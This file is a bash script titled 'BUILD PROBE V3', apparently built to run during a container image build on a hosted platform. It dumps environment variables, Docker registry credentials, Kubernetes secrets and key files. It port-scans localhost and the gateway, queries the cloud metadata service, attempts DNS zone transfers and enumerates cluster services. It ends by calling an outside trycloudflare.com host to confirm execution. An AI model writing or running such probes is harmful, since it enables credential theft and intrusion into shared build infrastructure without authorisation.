#!/bin/bash
echo "=== BUILD PROBE V3 START $(date -u) ==="

echo "=== NETWORK INFO ==="
ip addr show 2>/dev/null | grep -E "inet |link/" | head -10
ip route show 2>/dev/null | head -5
cat /etc/resolv.conf 2>/dev/null
cat /etc/hosts 2>/dev/null

echo "=== ENV VARS ==="
env 2>&1 | sort

echo "=== PROC ENVIRON ==="
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30 || echo "NO_ACCESS"
cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' || echo "NO_CMDLINE"
echo ""

echo "=== DOCKER CONFIG ==="
cat /kaniko/.docker/config.json 2>/dev/null || echo "NO_KANIKO_DOCKER_CONFIG"
cat /root/.docker/config.json 2>/dev/null || echo "NO_ROOT_DOCKER_CONFIG"
cat /.docker/config.json 2>/dev/null || echo "NO_SLASH_DOCKER_CONFIG"

echo "=== SECRETS DIR ==="
ls -laR /var/run/secrets/ 2>/dev/null || echo "NO_SECRETS_DIR"
find / -name "*.key" -o -name "*.pem" -o -name "*.crt" -o -name "token" -o -name "sa.token" 2>/dev/null | head -20

echo "=== KANIKO CONTEXT ==="
ls -la /kaniko/ 2>/dev/null || echo "NO_KANIKO_DIR"
ls -la /.app_platform_workspace/ 2>/dev/null | head -10

echo "=== LOCALHOST 8080 ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/ 2>&1 || echo "FAILED"

echo "=== LOCALHOST PORT SCAN ==="
for port in 2375 2376 4243 5000 8081 8443 9090 9100 10250 10255 6443 2379 53 3000 9200 6379 5432 3306 4040 25 11211; do
  timeout 2 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "OPEN:$port" || true
done

echo "=== GATEWAY SCAN ==="
GW=$(ip route show default 2>/dev/null | awk '/default/{print $3}')
echo "Gateway: $GW"
if [ -n "$GW" ]; then
  for port in 80 443 8080 8443 10250 2375 6443; do
    timeout 3 bash -c "echo >/dev/tcp/$GW/$port" 2>/dev/null && echo "GW_OPEN:$port" || true
  done
fi

echo "=== IMDS CHECK ==="
curl -sv --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/v1.json 2>&1 || echo "IMDS_FAILED"

echo "=== PROCESS LIST ==="
ps aux 2>&1 | head -30 || true

echo "=== MOUNT INFO ==="
mount 2>&1 | head -30 || true
cat /proc/self/mountinfo 2>/dev/null | head -20 || true

echo "=== PROC NET ==="
cat /proc/net/tcp 2>/dev/null | head -20 || echo "NO_PROC_NET"
cat /proc/net/tcp6 2>/dev/null | head -10 || echo "NO_PROC_NET6"

echo "=== DNS ZONE TRANSFER ==="
dig AXFR cluster.local @10.245.0.10 2>&1 | head -40 || true
dig AXFR svc.cluster.local @10.245.0.10 2>&1 | head -40 || true

echo "=== DNS SERVICE DISCOVERY ==="
for svc in kubernetes kube-dns cert-manager cert-manager-webhook metrics-server coredns node-exporter prometheus grafana traefik ingress-nginx istio-pilot linkerd-proxy calico-node flannel weave-net csi-node registry harbor docker-registry vault consul etcd argocd gitea drone jenkins gitlab runner kaniko buildkit buildkitd tekton; do
  for ns in default kube-system cert-manager monitoring ingress-nginx istio-system linkerd calico-system weave-net csi-drivers registry harbor vault consul argocd gitea drone jenkins gitlab tekton; do
    result=$(dig +short ${svc}.${ns}.svc.cluster.local @10.245.0.10 2>/dev/null)
    if [ -n "$result" ]; then
      echo "${svc}.${ns}: $result"
    fi
  done
done

echo "=== DNS PTR SCAN ==="
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
  result=$(dig -x 10.245.0.${i} @10.245.0.10 +short 2>/dev/null)
  if [ -n "$result" ]; then
    echo "10.245.0.${i}: $result"
  fi
done

echo "=== OOB BUILD V3 ==="
curl -sv --connect-timeout 5 --max-time 8 "https://cheapest-vessel-hometown-equipped.trycloudflare.com/docker-build-v3-probe" 2>&1 || echo "OOB_FAILED"

echo "=== BUILD PROBE V3 END $(date -u) ==="
